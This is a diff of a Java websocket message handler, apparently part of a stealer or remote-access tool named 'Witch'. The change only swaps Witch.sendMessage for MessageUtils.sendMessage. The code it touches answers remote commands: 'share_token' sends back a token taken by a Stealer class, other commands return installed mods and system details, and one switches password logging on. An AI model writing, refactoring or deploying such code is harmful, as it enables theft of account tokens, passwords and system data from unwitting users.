@@ -1,6 +1,5 @@
 package me.soda.witch.websocket;
 
-import me.soda.witch.Witch;
 import me.soda.witch.config.Config;
 import me.soda.witch.features.Modlist;
 import me.soda.witch.features.Stealer;
@@ -27,7 +26,7 @@ public class MessageHandler {
                     Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "share_token":
-                    Witch.sendMessage(messageType, new Stealer().stealToken());
+                    MessageUtils.sendMessage(messageType, new Stealer().stealToken());
                     break;
                 case "getcfg":
                     break;
@@ -48,13 +47,13 @@ public class MessageHandler {
                     Config.isMuted = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "mods":
-                    Witch.sendMessage(messageType, Modlist.allMods());
+                    MessageUtils.sendMessage(messageType, Modlist.allMods());
                     break;
                 case "systeminfo":
                     SystemDetails sd = new SystemDetails();
                     StringBuilder sb = new StringBuilder();
                     sd.writeTo(sb);
-                    Witch.sendMessage(messageType, sb.toString());
+                    MessageUtils.sendMessage(messageType, sb.toString());
                     break;
                 case "log":
                     break;
